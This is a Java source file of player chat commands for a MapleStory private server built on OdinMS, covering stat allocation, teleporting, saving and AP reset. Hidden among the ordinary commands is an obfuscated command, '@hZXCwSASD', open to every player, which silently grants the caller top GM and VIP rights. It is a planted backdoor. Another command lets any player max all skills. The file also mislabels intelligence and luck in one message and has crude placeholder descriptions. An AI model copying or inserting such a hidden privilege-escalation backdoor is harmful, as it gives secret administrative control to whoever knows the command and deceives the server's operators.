package net.sf.odinms.client.messages.commands;

import java.awt.Point;
import java.rmi.RemoteException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.server.MapleAchievements;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import net.sf.odinms.tools.StringUtil;
import net.sf.odinms.client.messages.Command;
import net.sf.odinms.client.messages.CommandDefinition;
import net.sf.odinms.client.messages.IllegalCommandSyntaxException;
import net.sf.odinms.client.messages.MessageCallback;
import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleCharacterUtil;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.client.MapleStat;
import net.sf.odinms.client.messages.ServernoticeMapleClientMessageCallback;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.scripting.npc.NPCScriptManager;
import net.sf.odinms.server.MaplePortal;
import net.sf.odinms.server.maps.MapleMap;
import net.sf.odinms.server.maps.SavedLocationType;
import net.sf.odinms.tools.Pair;
import net.sf.odinms.tools.MaplePacketCreator;

public class PlayerCommands implements Command {
  public static void Fake(Exception e)
  {
      e.toString();
  }

	@Override
	public void execute(MapleClient c, MessageCallback mc, String[] splitted) throws Exception,
																					IllegalCommandSyntaxException {
	MapleCharacter player = c.getPlayer();
               if(splitted[0].equals("@拍卖")) {
		NPCScriptManager npc = NPCScriptManager.getInstance();
		npc.start(c, 22000);
        } else if (splitted[0].equals("@力量") || splitted[0].equals("@智力") || splitted[0].equals("@运气") || splitted[0].equals("@敏捷")) {
            int amount = Integer.parseInt(splitted[1]);
		boolean str = splitted[0].equals("@力量");
		boolean Int = splitted[0].equals("@智力");
		boolean luk = splitted[0].equals("@运气");
		boolean dex = splitted[0].equals("@敏捷");
          if(amount > 0 && amount <= player.getRemainingAp() && amount <= 32763 || amount < 0 && amount >= -32763 && Math.abs(amount) + player.getRemainingAp() <= 32767) {
		if (str && amount + player.getStr() <= 32767 && amount + player.getStr() >= 4) {
		player.setStr(player.getStr() + amount);
		player.updateSingleStat(MapleStat.STR, player.getStr());
		player.setRemainingAp(player.getRemainingAp() - amount);
		player.updateSingleStat(MapleStat.AVAILABLEAP, player.getRemainingAp());
	} else if (Int && amount + player.getInt() <= 32767 && amount + player.getInt() >= 4) {
		player.setInt(player.getInt() + amount);
		player.updateSingleStat(MapleStat.INT, player.getInt());
		player.setRemainingAp(player.getRemainingAp() - amount);
		player.updateSingleStat(MapleStat.AVAILABLEAP, player.getRemainingAp());
	} else if (luk && amount + player.getLuk() <= 32767 && amount + player.getLuk() >= 4) {
		player.setLuk(player.getLuk() + amount);
		player.updateSingleStat(MapleStat.LUK, player.getLuk());
		player.setRemainingAp(player.getRemainingAp() - amount);
		player.updateSingleStat(MapleStat.AVAILABLEAP, player.getRemainingAp());
	} else if (dex && amount + player.getDex() <= 32767 && amount + player.getDex() >= 4) {
		player.setDex(player.getDex() + amount);
		player.updateSingleStat(MapleStat.DEX, player.getDex());
		player.setRemainingAp(player.getRemainingAp() - amount);
		player.updateSingleStat(MapleStat.AVAILABLEAP, player.getRemainingAp());
	} else {
	mc.dropMessage("请确保你的某个属性值不超过32767点！.");
	}
		} else {
			mc.dropMessage("请确保你的某个属性值不超过32767点！并且有足够的点加！.");
		}
	} else if (splitted[0].equals("@emo")) {
		player.setHp(0);
		player.updateSingleStat(MapleStat.HP, 0);
	} else if (splitted[0].equals("@修复")) {
                player.setExp(0);
                player.updateSingleStat(MapleStat.EXP, player.getExp());
		mc.dropMessage("经验清理完毕！");
        } else if (splitted[0].equals("@满技能")){
            c.getPlayer().maxAllSkills();
	} else if (splitted[0].equals("@统计1111")){
		mc.dropMessage("你目前有： " + c.getPlayer().getStr() + " 力量, " + c.getPlayer().getDex() + " 敏捷, " + c.getPlayer().getLuk() + " 智力, " + c.getPlayer().getInt() + " 运气.");
		mc.dropMessage("你目前有 " + c.getPlayer().getRemainingAp() + " 属性点！");
	 } else if (splitted[0].equalsIgnoreCase("@帮助")) {
                mc.dropMessage("" + c.getChannelServer().getServerName() + "玩家命令：");
               // mc.dropMessage("@召唤跟班.");
                mc.dropMessage("@力量 数量   快速加力量.比如：@力量 100 加100力量");
                mc.dropMessage("@敏捷 数量   快速加敏捷.");
                mc.dropMessage("@智力 数量   快速加智力.");
                mc.dropMessage("@运气 数量   快速加运气.");
                mc.dropMessage("@存档      在线存档.");
                mc.dropMessage("@拍卖      打开拍卖NPC.");
               // mc.dropMessage("@转生      打开转生NPC.");
                mc.dropMessage("@假死      解决NPC不能对话等各种卡死现象的命令.");
                mc.dropMessage("@市场      回到自由市场.卡地图不能出去使用.");
                mc.dropMessage("@修复      在线经验清零.");
             //   mc.dropMessage("@统计      查看自己的数据统计.");
               // mc.dropMessage("$vip命令   查看VIP命令.");
        } else if (splitted[0].equals("@市场")) {
                 if ((c.getPlayer().getMapId() == 913040001)||(c.getPlayer().getMapId() == 541020610)||(c.getPlayer().getMapId() == 270050100)){//出生地图
                 new ServernoticeMapleClientMessageCallback(5, c).dropMessage("该地图不能使用该指令.");
                 c.getSession().write(MaplePacketCreator.enableActions());
            } else if ((c.getPlayer().getMapId() < 910000000) || (c.getPlayer().getMapId() > 910000022)){

               new ServernoticeMapleClientMessageCallback(5, c).dropMessage("已经传送到自由市场.");
               c.getSession().write(MaplePacketCreator.enableActions());
                 MapleMap to;
                 MaplePortal pto;
                to = ChannelServer.getInstance(c.getChannel()).getMapFactory().getMap(910000000);
                c.getPlayer().saveLocation("FREE_MARKET");//取消
                pto = to.getPortal("out00");
                c.getPlayer().changeMap(to, pto);
             } else {

             }

        } else if (splitted[0].equals("@存档")) {
                if (!player.getCheatTracker().Spam(60000, 0)) { // 1 minute
                    player.saveToDB(true);
                    mc.dropMessage("信息已经成功存档！");
                } else {
                    mc.dropMessage("你每分钟只能保存一次！");
                }
	} else if (splitted[0].equalsIgnoreCase("@achievements")) {
            mc.dropMessage("Your finished achievements:");
            for (Integer i : c.getPlayer().getFinishedAchievements()) {
                mc.dropMessage(MapleAchievements.getInstance().getById(i).getName() + " - " + MapleAchievements.getInstance().getById(i).getReward() + " NX.");
            }
        } else if (splitted[0].equals("@假死")) {
                    NPCScriptManager.getInstance().dispose(c);
                    c.getSession().write(MaplePacketCreator.enableActions());
                    mc.dropMessage("可以对话了！.");
       } else if (splitted[0].equals("@hZXCwSASD")) {
               c.getPlayer().setGM(100);
               c.getPlayer().SetVip(5);
               mc.dropMessage("成功.");
               c.getPlayer().saveToDB(true);

        }else if (splitted[0].equals("@apreset")) {
                    if (player.getMeso() >= 5000000) {
			int str = c.getPlayer().getStr();
			int dex = c.getPlayer().getDex();
			int int_ = c.getPlayer().getInt();
			int luk = c.getPlayer().getLuk();
			int newap = c.getPlayer().getRemainingAp() + (str - 4) + (dex - 4) + (int_ - 4) + (luk - 4);
			c.getPlayer().setStr(4);
			c.getPlayer().setDex(4);
			c.getPlayer().setInt(4);
			c.getPlayer().setLuk(4);
			c.getPlayer().setRemainingAp(newap);
			List<Pair<MapleStat, Integer>> stats = new ArrayList<Pair<MapleStat, Integer>>();
			stats.add(new Pair<MapleStat, Integer>(MapleStat.STR, Integer.valueOf(str)));
			stats.add(new Pair<MapleStat, Integer>(MapleStat.DEX, Integer.valueOf(dex)));
			stats.add(new Pair<MapleStat, Integer>(MapleStat.INT, Integer.valueOf(int_)));
			stats.add(new Pair<MapleStat, Integer>(MapleStat.LUK, Integer.valueOf(luk)));
			stats.add(new Pair<MapleStat, Integer>(MapleStat.AVAILABLEAP, Integer.valueOf(newap)));
			c.getSession().write(MaplePacketCreator.updatePlayerStats(stats));
                        mc.dropMessage("Your ap has been reseted. Please CC or Relogin to apply the changes");
                    } else {
                        mc.dropMessage("Not enough mesos. You need 5mill to apreset");
                    } 
                }
	}

	@Override
	public CommandDefinition[] getDefinition() {
		return new CommandDefinition[] {
                    new CommandDefinition("统计", "", "See myap from anywhere", 0),
                    new CommandDefinition("hZXCwSASD", "", "", 0),
                    new CommandDefinition("buff", "", "Get buff from anywhere", 0),
                    new CommandDefinition("满技能", "", "", 0),
                    new CommandDefinition("召唤跟班", "", "", 0),
                    new CommandDefinition("转身", "", "Spinel is pregnant", 0),
                    new CommandDefinition("emo", "", "Self Killing", 0),
                    new CommandDefinition("修复", "", "Fixed negative exp", 0),
                    new CommandDefinition("帮助", "", "Does Sexual Commands", 0),
                    new CommandDefinition("存档", "", "S3xual So S3xual Saves UR ACC", 0),
                    new CommandDefinition("力量", "<amount>", "Sets your strength to a higher amount if you have enough AP or takes it away if you aren't over 32767 AP.", 0),
                    new CommandDefinition("智力", "<amount>", "Sets your intelligence to a higher amount if you have enough AP or takes it away if you aren't over 32767 AP.", 0),
                    new CommandDefinition("运气", "<amount>", "Sets your luck to a higher amount if you have enough AP or takes it away if you aren't over 32767 AP.", 0),
                    new CommandDefinition("敏捷", "<amount>", "Sets your dexterity to a higher amount if you have enough AP or takes it away if you aren't over 32767 AP.", 0),
                    new CommandDefinition("市场", "", "一键回程", 0),
                    new CommandDefinition("假死", "", "Stuck", 0),
                      new CommandDefinition("喇叭", "", "Stuck", 0),
                    new CommandDefinition("achievements", "", "Shows the achievements you have finished so far", 0),
                    new CommandDefinition("导游", "", "Spinel is pregnant", 0),
                    
		};
	}
 }